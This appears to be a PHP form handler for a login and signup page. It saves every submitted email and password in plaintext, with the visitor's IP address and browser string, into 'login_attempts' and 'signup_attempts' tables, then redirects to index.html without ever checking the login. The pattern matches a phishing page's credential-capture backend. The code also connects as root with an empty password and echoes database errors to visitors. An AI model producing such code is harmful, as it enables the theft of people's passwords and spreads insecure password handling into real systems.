<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "lform";

try {
    // Connect to database
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Check if form was submitted
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get common data for both forms
        $submit_time = date('Y-m-d H:i:s');
        $ip_address = $_SERVER['REMOTE_ADDR'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'];

        // Check which form was submitted based on the presence of fullName field
        if (isset($_POST['fullName'])) {
            // This is a signup form submission
            $fullName = $_POST['fullName'];
            $email = $_POST['email'];
            $password = $_POST['password'];

            // Prepare SQL for signup
            $sql = "INSERT INTO signup_attempts (full_name, email, password, signup_time, ip_address, user_agent) 
                    VALUES (:full_name, :email, :password, :signup_time, :ip_address, :user_agent)";
            
            $stmt = $conn->prepare($sql);
            
            // Execute signup statement
            $stmt->execute([
                'full_name' => $fullName,
                'email' => $email,
                'password' => $password,
                'signup_time' => $submit_time,
                'ip_address' => $ip_address,
                'user_agent' => $user_agent
            ]);

            echo "Signup attempt recorded successfully";
        } else {
            // This is a login form submission
            $email = $_POST['email'];
            $password = $_POST['password'];

            // Prepare SQL for login
            $sql = "INSERT INTO login_attempts (email, password, login_time, ip_address, user_agent) 
                    VALUES (:email, :password, :login_time, :ip_address, :user_agent)";
            
            $stmt = $conn->prepare($sql);
            
            // Execute login statement
            $stmt->execute([
                'email' => $email,
                'password' => $password,
                'login_time' => $submit_time,
                'ip_address' => $ip_address,
                'user_agent' => $user_agent
            ]);
        }

        // Redirect to index.html after successful form submission
        header("Location: index.html");
        exit();

        }
} catch(PDOException $e) {
    echo "Error: " . $e->getMessage();
    // Wait 3 seconds and redirect even if there's an error
    echo "<script>setTimeout(function(){ window.location.href = 'index.html'; }, 3000);</script>";
}
?>